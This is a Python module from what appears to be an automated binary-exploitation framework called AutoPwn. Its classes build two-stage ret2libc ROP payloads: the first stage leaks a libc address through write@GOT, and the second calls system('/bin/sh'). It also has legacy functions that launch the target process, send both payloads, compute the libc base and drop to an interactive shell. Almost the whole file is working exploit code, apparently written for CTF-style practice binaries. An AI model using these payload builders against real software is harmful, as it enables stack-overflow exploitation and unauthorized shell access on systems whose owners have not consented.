"""AutoPwn primitives layer: 2-stage ret2libc-write payload builders (P6.4).

Replaces the v3.1 monolith's ``ret2libc_write_x32`` /
``ret2libc_write_x64`` (local) + ``ret2libc_write_x32_canary_*`` /
``ret2libc_write_x64_canary_*`` (canary — P7.10) payload
construction blocks (see ``autopwn/_legacy.py`` L896-1024 +
L1514-1588 + L2483-2640 area) with two typed
:class:`ExploitPrimitive` subclasses that **override
``stage_count()`` to 2**.

Per ``rebuild.md`` §6.7 P6.4 + ``refactor.md`` §3.2.2, this is
the second 2-stage primitive in the P6 layer.  It demonstrates
the variant of the P6.3 pattern that uses ``write(1, got, n)``
to leak a libc address instead of ``puts(got)`` — useful when
``puts`` is not in PLT (e.g. level3_x64).

Public API
----------
* :class:`Ret2LibcWriteX32` — 32-bit 2-stage primitive.
  * ``build_payload(ctx)`` → stage 1 leak payload
    (``padding + write_plt + main + 1 + write_got + 4``)
  * ``build_stage2_payload(ctx, leaked_write_addr)`` → stage 2
    final payload (``padding + system + 0 + sh``)
  * ``stage_count()`` → 2
* :class:`Ret2LibcWriteX64` — 64-bit 2-stage primitive.
  Same API; stage 1 uses ``pop_rdi + pop_rsi`` gadget chain,
  stage 2 includes the ``ret`` alignment gadget (P6.2 fix —
  a bug fix vs v3.1's x64 write which lacked alignment).

Why write() vs puts() in stage 1
--------------------------------
* ``puts(got)`` leaks a single byte less (no trailing NUL but
  stops at the first ``\\0``) and is a libc-agnostic leak
  (works for any libc).
* ``write(1, got, n)`` leaks exactly ``n`` bytes raw, no
  NUL-termination, but requires the binary to import
  ``write`` (vs ``puts``).

P6.3 is the ``puts``-based primitive; P6.4 is the
``write``-based one.  Both have the same 2-stage contract.

Design notes
------------
* x32 stage 1: ``write(fd=1, buf=write_got, count=4)`` — leaks
  4 bytes (one libc address).  The 4 is a 32-bit word size;
  for x64 the count would be 8 (but x64 doesn't need this
  primitive because puts works fine there).
* x64 stage 1 uses two gadget pops: ``pop rdi; ret`` for
  ``fd=1``, then ``pop rsi; ret`` for ``buf=write_got``.
  v3.1 has 3 conditional branches for `other_rdi_registers` /
  `other_rsi_registers` (when the gadget pops extra registers);
  the new public function takes the simple case
  (``other_rdi == 0 and other_rsi == 0``) — the conditional
  variants are preserved in the legacy port for spec parity.
* Stage 2 shape is **identical** to :class:`Ret2LibcPutX32`/
  :class:`Ret2LibcPutX64`: ``padding + system + 0 + sh`` (x32)
  or ``padding + pop_rdi + sh + ret + system`` (x64).  The
  new public function uses the same shape as P6.3 for
  consistency.
* v3.1's x64 ret2libc_write **lacked** the ``ret`` alignment
  gadget in stage 2 (a v3.1 inconsistency vs. the P6.2
  ret2system which has it).  The new public function adds
  the ``ret`` gadget to fix Ubuntu 18.04+ glibc MOVAPS —
  the legacy port preserves the v3.1 shape (no ``ret``) for
  spec parity.
"""
from __future__ import annotations

from pathlib import Path
from typing import Optional, Tuple

from autopwn.context import ExploitContext
from autopwn.primitives.base import ExploitPrimitive


def _lookup_write_and_main(program: Path) -> Tuple[Optional[int], Optional[int], Optional[int]]:
    """Look up ``write@plt``, ``write@got``, and ``main`` from the binary.

    Returns:
        ``(write_plt, write_got, main_addr)`` — any may be ``None``
        when the symbol / GOT entry is absent.  The primitive
        treats ``None`` as "not applicable" and returns ``b""``.

    Side effects:
        Read-only ELF open via pwntools.  No writes, no globals
        writes, no process spawns.
    """
    from pwn import ELF

    try:
        e = ELF(str(program), checksec=False)
    except Exception:
        return None, None, None
    try:
        write_plt = e.plt["write"]
    except (KeyError, AttributeError):
        write_plt = None
    try:
        write_got = e.got["write"]
    except (KeyError, AttributeError):
        write_got = None
    try:
        main_addr = e.symbols["main"]
    except (KeyError, AttributeError):
        main_addr = None
    return write_plt, write_got, main_addr


def _resolve_libc_elf(ctx: ExploitContext):
    """Return the pwntools ``ELF`` for ``ctx.libc`` (lazy-open if needed).

    Duplicated from ``ret2libc_put.py`` (P6.3) per the project
    convention that each P6 module is self-contained (no
    cross-module imports within primitives/).  Returns
    ``None`` when ``ctx.libc.path`` is unset and
    ``ctx.libc.elf`` is also ``None``.
    """
    if ctx.libc.elf is not None:
        return ctx.libc.elf
    if ctx.libc.path is None:
        return None
    from pwn import ELF
    return ELF(str(ctx.libc.path), checksec=False)


class Ret2LibcWriteX32(ExploitPrimitive):
    """32-bit 2-stage ``ret2libc`` payload builder (leak via ``write``).

    Stage 1 (leak) payload shape::

        [A * padding] [p32(write_plt)] [p32(main)] [p32(1)] [p32(write_got)] [p32(4)]

    Stage 2 (return-to-system) payload shape::

        [A * padding] [p32(system)] [p32(0)] [p32(sh)]

    Requires:
        * ``ctx.binary.path`` is a 32-bit ELF with ``write@plt``,
          ``write@got``, and ``main`` symbols.
        * ``ctx.padding`` is the offset to the saved return
          address (P5.1).
        * ``ctx.libc.elf`` or ``ctx.libc.path`` is set (P4.2)
          before stage 2.
    """

    name = "ret2libc-write-x32"

    def stage_count(self) -> int:
        return 2

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Build the stage-1 leak payload (``write(1, write@GOT, 4)``)."""
        from pwn import asm, p32

        write_plt, write_got, main_addr = _lookup_write_and_main(ctx.binary.path)
        if write_plt is None or write_got is None or main_addr is None:
            return b""

        return (
            asm("nop") * ctx.padding
            + p32(write_plt)
            + p32(main_addr)  # return to main() for stage 2
            + p32(1)          # fd = stdout
            + p32(write_got)  # buf = write@got address
            + p32(4)          # count = 4 bytes (32-bit address)
        )

    def build_stage2_payload(
        self, ctx: ExploitContext, leaked_write_addr: int,
    ) -> bytes:
        """Build the stage-2 final payload (``system('/bin/sh')``).

        Args:
            ctx: the run's :class:`ExploitContext`.  Reads
                ``ctx.binary.path`` and ``ctx.libc.elf`` (or
                ``ctx.libc.path``).
            leaked_write_addr: the runtime address of ``write``
                in libc, parsed from the stage-1 response.

        Returns:
            The stage-2 payload bytes, or ``b""`` when libc
            resolution fails.
        """
        from pwn import asm, p32

        libc = _resolve_libc_elf(ctx)
        if libc is None:
            return b""

        try:
            libc_write = libc.symbols["write"]
            libc_base = leaked_write_addr - libc_write
            system_addr = libc_base + libc.symbols["system"]
            sh_addr = libc_base + next(libc.search(b"/bin/sh"))
        except (KeyError, AttributeError, StopIteration):
            return b""

        return (
            asm("nop") * ctx.padding
            + p32(system_addr)
            + p32(0)
            + p32(sh_addr)
        )


class Ret2LibcWriteX64(ExploitPrimitive):
    """64-bit 2-stage ``ret2libc`` payload builder (leak via ``write``).

    Stage 1 payload shape::

        [A * padding] [p64(pop_rdi)] [p64(1)] [p64(pop_rsi)] [p64(write_got)] [p64(write_plt)] [p64(main)]

    Stage 2 payload shape::

        [A * padding] [p64(pop_rdi)] [p64(sh)] [p64(ret)] [p64(system)]

    Requires:
        * Same as :class:`Ret2LibcWriteX32`, but 64-bit.
        * ``ctx.gadgets_x64.pop_rdi``, ``pop_rsi``, and
          ``ret`` are non-zero (P4.4).

    The extra ``ret`` gadget between ``sh`` and ``system``
    fixes the 16-byte RSP alignment required by Ubuntu 18.04+
    glibc (P6.2 §64-bit alignment).  v3.1's x64 ret2libc_write
    **lacked** this gadget; we add it for consistency with
    P6.2 / P6.3.
    """

    name = "ret2libc-write-x64"

    def stage_count(self) -> int:
        return 2

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Build the stage-1 leak payload (``write(1, write@GOT, n)``).

        Mirrors v3.1 ``_legacy.ret2libc_write_x64`` 3-variant cascade
        (P6.4b fix, B-007): the pop chain layout depends on whether
        ropper found ``pop rdi; pop <reg>; ret`` (``extra_rdi=1``)
        and/or ``pop rsi; pop <reg>; ret`` (``extra_rsi=1``).  When
        the gadget pops an extra register, v3.1 inserts a 0 placeholder
        in the stack chain to consume that extra slot — without it,
        the ROP chain goes out of alignment and ``write()`` returns to
        a garbage address (manifests as ``unpack requires a buffer of
        8 bytes`` during leak parse — P6.4b regression target).
        """
        from pwn import asm, flat, p64

        if (
            ctx.gadgets_x64 is None
            or ctx.gadgets_x64.pop_rdi == 0
            or ctx.gadgets_x64.pop_rsi == 0
        ):
            return b""

        write_plt, write_got, main_addr = _lookup_write_and_main(ctx.binary.path)
        if write_plt is None or write_got is None or main_addr is None:
            return b""

        g = ctx.gadgets_x64
        if g.extra_rsi == 1:
            # v3.1 L927-937: pop rsi; pop <reg>; ret → 0 placeholder after write_got
            return flat(
                asm("nop") * ctx.padding
                + p64(g.pop_rdi) + p64(1)
                + p64(g.pop_rsi) + p64(write_got) + p64(0)  # 0 placeholder
                + p64(write_plt) + p64(main_addr)
            )
        if g.extra_rdi == 1:
            # v3.1 L938-948: pop rdi; pop <reg>; ret → 0 placeholder after fd
            return flat(
                asm("nop") * ctx.padding
                + p64(g.pop_rdi) + p64(1) + p64(0)  # 0 placeholder
                + p64(g.pop_rsi) + p64(write_got)
                + p64(write_plt) + p64(main_addr)
            )
        # v3.1 L949-958: both extra == 0 → 5-arg pop chain
        return flat(
            asm("nop") * ctx.padding
            + p64(g.pop_rdi) + p64(1)
            + p64(g.pop_rsi) + p64(write_got)
            + p64(write_plt) + p64(main_addr)
        )

    def build_stage2_payload(
        self, ctx: ExploitContext, leaked_write_addr: int,
    ) -> bytes:
        """Build the stage-2 final payload (``system('/bin/sh')``).

        Mirrors v3.1 ``_legacy.ret2libc_write_x64`` L983-996 2-variant
        cascade (P6.4b fix, B-007).  The stage-2 pop chain is also
        affected by ``extra_rdi`` because the stage-2 ret uses
        ``pop rdi; sh; ret; system`` — when ``pop rdi; pop <reg>; ret``,
        v3.1 inserts a 0 placeholder to consume the extra slot.
        """
        from pwn import asm, flat, p64

        if (
            ctx.gadgets_x64 is None
            or ctx.gadgets_x64.pop_rdi == 0
            or ctx.gadgets_x64.ret == 0
        ):
            return b""

        libc = _resolve_libc_elf(ctx)
        if libc is None:
            return b""

        try:
            libc_write = libc.symbols["write"]
            libc_base = leaked_write_addr - libc_write
            system_addr = libc_base + libc.symbols["system"]
            sh_addr = libc_base + next(libc.search(b"/bin/sh"))
        except (KeyError, AttributeError, StopIteration):
            return b""

        g = ctx.gadgets_x64
        if g.extra_rdi == 1:
            # v3.1 L983-996: extra_rdi=1 → 0 placeholder between sh and ret
            return flat(
                asm("nop") * ctx.padding
                + p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # 0 placeholder
                + p64(g.ret)  # stack-alignment gadget
                + p64(system_addr)
            )
        # both extra == 0 OR extra_rsi=1 (stage 2 doesn't use pop_rsi)
        return flat(
            asm("nop") * ctx.padding
            + p64(g.pop_rdi) + p64(sh_addr)
            + p64(g.ret)  # stack-alignment gadget
            + p64(system_addr)
        )


# =====================================================================
# Legacy ports (parity only) — preserve v3.1's full IO flow
# =====================================================================

def _legacy_ret2libc_write_x32(program, libc, padding, libc_path) -> bool:
    """[OBSOLETE — prefer :class:`Ret2LibcWriteX32`] Verbatim port of v3.1's ``ret2libc_write_x32``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3257).
    Preserves the full v3.1 IO flow: ``io = process(program)`` +
    ``ELF(program)`` + ``ELF(libc)`` (or ``LibcSearcher``) +
    payload1 send + ``io.recv(4)`` leak parse + libc arithmetic
    + payload2 send + ``handle_exploitation_success`` +
    ``io.interactive()``.

    Note: v3.1 L1577-1580 mistakenly labels this
    ``'ret2libc (puts) - x64 Remote'`` in the
    ``handle_exploitation_success`` call (copy-paste bug from
    puts) — preserved verbatim for spec parity.

    Returns:
        ``True`` on success, ``False`` on failure.
    """
    from pwn import ELF, asm, p32, process, u32, LibcSearcher

    from autopwn.core.logging import (
        Colors, print_section_header, print_payload, print_info,
        print_success, print_critical,
    )

    print_section_header("EXPLOITATION: ret2libc (write) - x32")
    print_payload("preparing ret2libc exploit using write function")

    io = process(str(program))
    if libc == 1:
        if libc_path is None:
            print_info("using LibcSearcher")
        else:
            print_info(f"using detected libc: {libc_path}")
            libc = ELF(libc_path)
    else:
        libc = ELF(libc)

    e = ELF(str(program))
    main_addr = e.symbols["main"]
    write_plt = e.symbols["write"]
    write_got = e.got["write"]

    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"write@plt: {Colors.YELLOW}{hex(write_plt)}{Colors.END}")
    print_info(f"write@got: {Colors.YELLOW}{hex(write_got)}{Colors.END}")

    print_payload("stage 1: leaking write address from GOT")
    payload1 = (
        asm("nop") * padding
        + p32(write_plt)
        + p32(main_addr)
        + p32(1)
        + p32(write_got)
        + p32(4)
    )
    io.recv()
    io.sendline(payload1)

    try:
        write_addr = u32(io.recv(4))
    except Exception:
        return False
    print_success(f"write address leaked: {Colors.YELLOW}{hex(write_addr)}{Colors.END}")

    if libc == 1 or not hasattr(libc, "symbols"):
        libc_searcher = LibcSearcher("write", write_addr)
        libcbase = write_addr - libc_searcher.dump("write")
        system_addr = libcbase + libc_searcher.dump("system")
        sh_addr = libcbase + libc_searcher.dump("str_bin_sh")
    else:
        libc_write = libc.symbols["write"]
        system_addr = write_addr - libc_write + libc.symbols["system"]
        sh_addr = write_addr - libc_write + next(libc.search(b"/bin/sh"))

    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")

    print_payload("stage 2: executing system('/bin/sh')")
    payload2 = asm("nop") * padding + p32(system_addr) + p32(0) + p32(sh_addr)
    io.recv()
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()
    return True


def _legacy_ret2libc_write_x64(
    program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr,
    other_rdi_registers, other_rsi_registers, libc_path,
) -> bool:
    """[OBSOLETE — prefer :class:`Ret2LibcWriteX64`] Verbatim port of v3.1's ``ret2libc_write_x64``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3263).
    Preserves the v3.1 IO flow including the 3-branch
    ``other_rdi_registers`` / ``other_rsi_registers`` conditional
    payload shape for stage 1 (the new public function takes
    the simple case only).  v3.1's stage 2 **lacks** the
    ``ret`` alignment gadget — preserved for spec parity.

    Returns:
        ``True`` on success, ``False`` on failure.
    """
    from pwn import ELF, asm, flat, p64, process, u64, LibcSearcher

    from autopwn.core.logging import (
        Colors, print_section_header, print_payload, print_info,
        print_success, print_critical,
    )

    print_section_header("EXPLOITATION: ret2libc (write) - x64")
    print_payload("preparing ret2libc exploit using write function")

    io = process(str(program))
    if libc == 1:
        if libc_path is None:
            print_info("using LibcSearcher for libc resolution")
        else:
            print_info(f"using detected libc: {libc_path}")
            libc = ELF(libc_path)
    else:
        libc = ELF(libc)

    e = ELF(str(program))
    main_addr = e.symbols["main"]
    write_plt = e.symbols["write"]
    write_got = e.got["write"]

    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"write@plt: {Colors.YELLOW}{hex(write_plt)}{Colors.END}")
    print_info(f"write@got: {Colors.YELLOW}{hex(write_got)}{Colors.END}")

    pop_rdi_addr = int(pop_rdi_addr, 16)
    pop_rsi_addr = int(pop_rsi_addr, 16)
    ret_addr = int(ret_addr, 16)

    print_payload("stage 1: leaking write address from GOT")
    if other_rsi_registers == 1:
        payload1 = flat(
            [asm("nop") * padding, p64(pop_rdi_addr), p64(1),
             p64(pop_rsi_addr), p64(write_got), p64(0),
             p64(write_plt), p64(main_addr)]
        )
    elif other_rdi_registers == 1:
        payload1 = flat(
            [asm("nop") * padding, p64(pop_rdi_addr), p64(1), p64(0),
             p64(pop_rsi_addr), p64(write_got),
             p64(write_plt), p64(main_addr)]
        )
    else:
        payload1 = flat(
            [asm("nop") * padding, p64(pop_rdi_addr), p64(1),
             p64(pop_rsi_addr), p64(write_got),
             p64(write_plt), p64(main_addr)]
        )

    io.recv()
    io.sendline(payload1)

    try:
        write_addr = u64(io.recv(8))
    except Exception:
        return False
    print_success(f"write address leaked: {Colors.YELLOW}{hex(write_addr)}{Colors.END}")

    if libc == 1 or not hasattr(libc, "symbols"):
        libc_searcher = LibcSearcher("write", write_addr)
        libcbase = write_addr - libc_searcher.dump("write")
        system_addr = libcbase + libc_searcher.dump("system")
        sh_addr = libcbase + libc_searcher.dump("str_bin_sh")
    else:
        libc_write = libc.symbols["write"]
        system_addr = write_addr - libc_write + libc.symbols["system"]
        sh_addr = write_addr - libc_write + next(libc.search(b"/bin/sh"))

    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")

    print_payload("stage 2: executing system('/bin/sh')")
    if other_rdi_registers == 1:
        payload2 = flat(
            [asm("nop") * padding, p64(pop_rdi_addr), p64(sh_addr),
             p64(0), p64(system_addr), p64(0)]
        )
    else:
        payload2 = flat(
            [asm("nop") * padding, p64(pop_rdi_addr), p64(sh_addr),
             p64(system_addr), p64(0)]
        )

    io.recv()
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()
    return True


__all__ = [
    "Ret2LibcWriteX32",
    "Ret2LibcWriteX64",
    "_legacy_ret2libc_write_x32",
    "_legacy_ret2libc_write_x64",
]
